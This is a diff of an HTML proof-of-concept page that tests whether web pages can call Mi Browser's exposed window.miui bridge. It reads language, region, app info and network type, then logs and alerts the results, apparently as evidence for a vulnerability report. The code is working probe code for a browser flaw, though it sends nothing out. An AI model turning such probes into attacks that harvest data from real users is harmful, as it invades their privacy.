@@ -1,72 +1,44 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Mi Browser UXSS PoC — pelioro</title>
-<style>
-  body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:18px}
-  pre{white-space:pre-wrap;background:#f7f7f7;padding:12px;border-radius:8px}
-  .ok{color:green}
-  .err{color:#b00}
-</style>
-<h2>Mi Browser UXSS PoC — safe calls</h2>
-<p>Ini PoC non-destruktif. Nunggu hasil panggilan window.miui (jika ada).</p>
+<title>Mi Browser UXSS — getActiveNetworkType PoC</title>
 <pre id="out">Starting…</pre>
 <script>
-(function(){
-  const out = id => document.getElementById('out');
-  function log(s){ out.textContent += '\\n' + s; console.log(s); }
-  function safeJSON(v){
-    try { return JSON.stringify(v); } catch(e) { return String(v); }
-  }
+function log(s){ document.getElementById('out').textContent += "\\n" + s; console.log(s); }
 
-  try {
-    if (typeof window.miui === 'object') {
-      log('window.miui FOUND — attempting safe calls…');
+try {
+  if (typeof window.miui === "object") {
+    log('window.miui FOUND — checking network API…');
 
-      // getLanguage
+    // try common names
+    var candidates = ['getActiveNetworkTypeName','getActiveNetworkType'];
+    var ok = false;
+    candidates.forEach(function(name){
       try {
-        if (typeof window.miui.getLanguage === 'function') {
-          const lang = window.miui.getLanguage();
-          log('getLanguage() => ' + String(lang));
-        } else log('getLanguage() not callable');
-      } catch(e){ log('getLanguage() threw: ' + e); }
+        if (typeof window.miui[name] === 'function') {
+          var v = window.miui[name]();
+          log(name + '() => ' + String(v));
+          try { alert('MIUI-POC ' + name + ': ' + String(v)); } catch(e){}
+          ok = true;
+        } else {
+          log(name + ' not callable');
+        }
+      } catch(e) {
+        log(name + ' threw: ' + e);
+        try { alert('MIUI-POC ' + name + ' THREW: ' + e); } catch(e){}
+        ok = true; // called but threw -> still useful evidence
+      }
+    });
 
-      // getRegion
-      try {
-        if (typeof window.miui.getRegion === 'function') {
-          const reg = window.miui.getRegion();
-          log('getRegion() => ' + String(reg));
-        } else log('getRegion() not callable');
-      } catch(e){ log('getRegion() threw: ' + e); }
-
-      // isNightModeEnabled
-      try {
-        if (typeof window.miui.isNightModeEnabled === 'function') {
-          const nm = window.miui.isNightModeEnabled();
-          log('isNightModeEnabled() => ' + String(nm));
-        } else log('isNightModeEnabled() not callable');
-      } catch(e){ log('isNightModeEnabled() threw: ' + e); }
-
-      // getApplicationInfo (may return object)
-      try {
-        if (typeof window.miui.getApplicationInfo === 'function') {
-          const info = window.miui.getApplicationInfo();
-          log('getApplicationInfo() => ' + safeJSON(info));
-        } else log('getApplicationInfo() not callable');
-      } catch(e){ log('getApplicationInfo() threw: ' + e); }
-
-      // final alert for screenshot
-      setTimeout(()=> {
-        try {
-          alert('MIUI-POC done — check page for details');
-        } catch(e){}
-      }, 300);
-    } else {
-      log('window.miui NOT FOUND on this page');
-      alert('MIUI-POC: window.miui NOT FOUND');
+    if (!ok) {
+      log('No network method found among candidates.');
+      alert('MIUI-POC: network method not found');
     }
-  } catch(err) {
-    log('TOP ERROR: ' + err);
-    alert('MIUI-POC ERROR: ' + err);
+  } else {
+    log('window.miui NOT FOUND');
+    alert('MIUI-POC: window.miui NOT FOUND');
   }
-})();
+} catch(err) {
+  log('TOP ERROR: ' + err);
+  alert('MIUI-POC ERR: ' + err);
+}
 </script>
